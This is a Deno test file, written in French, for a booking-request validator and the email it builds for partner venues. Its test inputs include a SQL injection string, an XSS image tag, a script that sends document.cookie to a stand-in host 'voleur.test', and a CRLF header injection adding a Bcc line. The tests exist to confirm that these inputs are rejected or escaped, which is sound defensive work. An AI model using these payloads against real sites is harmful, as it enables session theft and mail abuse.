import { assertEquals } from "https://deno.land/std@0.224.0/assert/mod.ts";
import { buildPartnerEmailHtml, buildPartnerEmailSubject, validateLead } from "./lead.ts";

const base = {
  kind: "generic",
  full_name: "Adjoua Konan",
  email: "adjoua@exemple.test",
  message: "Bonjour, je souhaite réserver une table pour samedi soir.",
};

Deno.test("accepte une demande complète", () => {
  const r = validateLead({
    ...base,
    place_id: "11111111-0000-4000-8000-000000000001",
    phone: "+225 07 07 07 07 07",
    party_size: "4",
    date_from: "2026-09-01",
    date_to: "2026-09-03",
    budget: "50 000 FCFA",
  });
  assertEquals(r.ok, true);
  if (r.ok) {
    assertEquals(r.data.party_size, 4);
    assertEquals(r.data.date_from, "2026-09-01");
  }
});

Deno.test("refuse un identifiant d'établissement qui n'est pas un uuid", () => {
  const r = validateLead({ ...base, place_id: "1 OR 1=1" });
  assertEquals(r.ok, false);
});

Deno.test("refuse une adresse email malformée", () => {
  assertEquals(validateLead({ ...base, email: "adjoua(at)exemple" }).ok, false);
});

Deno.test("refuse un type de demande inconnu", () => {
  assertEquals(validateLead({ ...base, kind: "admin" }).ok, false);
});

Deno.test("refuse un message hors bornes", () => {
  assertEquals(validateLead({ ...base, message: "ok" }).ok, false);
  assertEquals(validateLead({ ...base, message: "x".repeat(2001) }).ok, false);
});

Deno.test("refuse un nombre de personnes non numérique", () => {
  assertEquals(validateLead({ ...base, party_size: "beaucoup" }).ok, false);
  assertEquals(validateLead({ ...base, party_size: 0 }).ok, false);
});

Deno.test("refuse une date inexistante et un intervalle inversé", () => {
  assertEquals(validateLead({ ...base, date_from: "2026-02-31" }).ok, false);
  assertEquals(
    validateLead({ ...base, date_from: "2026-09-10", date_to: "2026-09-01" }).ok,
    false,
  );
});

Deno.test("le corps du courriel échappe le balisage du visiteur", () => {
  const r = validateLead({
    ...base,
    full_name: "<img src=x onerror=alert(1)>",
    message: "Bonjour <script>fetch('https://voleur.test?c='+document.cookie)</script> merci",
  });
  assertEquals(r.ok, true);
  if (!r.ok) return;
  const html = buildPartnerEmailHtml(r.data);
  // Le texte reste lisible, mais aucun signe n'ouvre plus de balise : le nom
  // et le message ne peuvent plus produire d'élément dans le courriel.
  assertEquals(html.includes("<script"), false);
  assertEquals(html.includes("<img"), false);
  assertEquals(html.includes("&lt;img src=x onerror=alert(1)&gt;"), true);
  assertEquals(html.includes("&lt;script&gt;"), true);
});

Deno.test("le corps du courriel conserve les sauts de ligne sans balisage", () => {
  const r = validateLead({ ...base, message: "Première ligne\nSeconde ligne" });
  assertEquals(r.ok, true);
  if (!r.ok) return;
  assertEquals(buildPartnerEmailHtml(r.data).includes("Première ligne<br/>Seconde ligne"), true);
});

Deno.test("l'objet du courriel ne transporte pas de retour chariot", () => {
  const subject = buildPartnerEmailSubject("Maquis\r\nBcc: victime@exemple.test");
  assertEquals(subject.includes("\r"), false);
  assertEquals(subject.includes("\n"), false);
});

Deno.test("l'objet du courriel a une valeur de repli", () => {
  assertEquals(buildPartnerEmailSubject(null), "Nouvelle demande pour votre établissement");
});
